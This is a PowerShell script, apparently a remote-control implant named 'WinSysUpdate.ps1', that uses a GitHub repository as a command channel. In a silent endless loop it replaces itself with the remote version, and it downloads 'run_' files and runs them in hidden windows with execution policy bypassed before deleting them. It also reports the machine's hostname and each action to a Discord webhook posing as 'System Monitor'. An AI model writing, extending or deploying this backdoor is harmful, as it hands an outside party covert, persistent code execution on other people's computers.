# --- UNIVERSAL WATCHER v3.0 (PRODUCTION - WEBHOOK ADDON) ---
$dir = Split-Path $MyInvocation.MyCommand.Path
$configFile = Join-Path $dir "config.txt"

# Load configuration
if (Test-Path $configFile) {
    $conf = Get-Content $configFile
    $user = $conf[0].Trim()
    $repo = $conf[1].Trim()
    $url = "https://raw.githubusercontent.com/$user/$repo/refs/heads/main"
} else { 
    exit 
}

# Discord webhook function (checks for webhook.txt in repo)
function Send-Webhook {
    param($msg)
    try {
        # Check if webhook addon is enabled
        $webhookUrl = "https://raw.githubusercontent.com/$user/$repo/refs/heads/main/webhook.txt?cache=$(Get-Random)"
        $webhook = (Invoke-WebRequest -Uri $webhookUrl -UseBasicParsing -TimeoutSec 5).Content.Trim()
        
        if ($webhook -and $webhook -like "https://discord.com/api/webhooks/*") {
            $payload = @{
                content = "**[$(hostname)]** $msg"
                username = "System Monitor"
            } | ConvertTo-Json
            Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
        }
    } catch {
        # Webhook not found or disabled - silent operation
    }
}

# Send startup notification
Send-Webhook ":white_check_mark: Watcher online"

while($true) {
    try {
        # 1. Self-Update with hash comparison
        try {
            $remoteUrl = "$url/WinSysUpdate.ps1?cache=$(Get-Random)"
            $remote = Invoke-WebRequest -Uri $remoteUrl -UseBasicParsing -TimeoutSec 10 -Headers @{"Cache-Control"="no-cache"} | Select-Object -ExpandProperty Content
            $local = Get-Content $MyInvocation.MyCommand.Path -Raw
            
            # Calculate SHA256 hashes for reliable comparison
            $remoteHash = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($remote)))
            $localHash = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($local)))
            
            if ($remoteHash -ne $localHash) {
                Send-Webhook ":arrows_counterclockwise: Update detected, restarting..."
                Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote -NoNewline
                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
                Start-Sleep -Seconds 1
                exit
            }
        } catch {
            # Silent fail
        }

        # 2. Check GitHub API for commands
        $apiUrl = "https://api.github.com/repos/$user/$repo/contents/"
        
        try {
            $files = Invoke-RestMethod -Uri $apiUrl -UseBasicParsing
            
            foreach ($f in $files) {
                $n = $f.name
                $u = $f.download_url
                $t = $f.type
                
                # Skip directories and system files
                if ($t -eq "dir" -or $n -eq "WinSysUpdate.ps1" -or $n -eq "config.txt" -or $n -eq "webhook.txt") {
                    continue
                }

                # CREATE command - stays on disk
                if ($n -like "create_*") {
                    try {
                        $cleanName = $n -replace "create_",""
                        $targetPath = Join-Path $dir $cleanName
                        
                        $content = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                        
                        $needsUpdate = $true
                        if (Test-Path $targetPath) {
                            $existingContent = Get-Content $targetPath -Raw
                            if ($existingContent -eq $content) {
                                $needsUpdate = $false
                            }
                        }
                        
                        if ($needsUpdate) {
                            Set-Content -Path $targetPath -Value $content
                            Send-Webhook ":page_facing_up: Created: ``$cleanName``"
                        }
                    } catch {
                        Send-Webhook ":warning: CREATE failed: ``$n``"
                    }
                }

                # RUN command - execute and delete
                if ($n -like "run_*") {
                    try {
                        $p = Join-Path $dir $n
                        Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
                        
                        if (Test-Path $p) {
                            if ($n -like "*.bat") { 
                                Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden
                                Send-Webhook ":rocket: Executed: ``$n`` (BAT)"
                            }
                            elseif ($n -like "*.ps1") { 
                                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$p`"" -WindowStyle Hidden
                                Send-Webhook ":rocket: Executed: ``$n`` (PS1)"
                            }

                            # Wait and delete
                            Start-Sleep -Seconds 3
                            if (Test-Path $p) { 
                                Remove-Item -Path $p -Force -ErrorAction SilentlyContinue 
                            }
                        }
                    } catch {
                        Send-Webhook ":x: RUN failed: ``$n``"
                    }
                }
            }
            
        } catch {
            # API error - silent
        }
        
    } catch { 
        # Main loop error - silent
    }
    
    Start-Sleep -Seconds 10
}
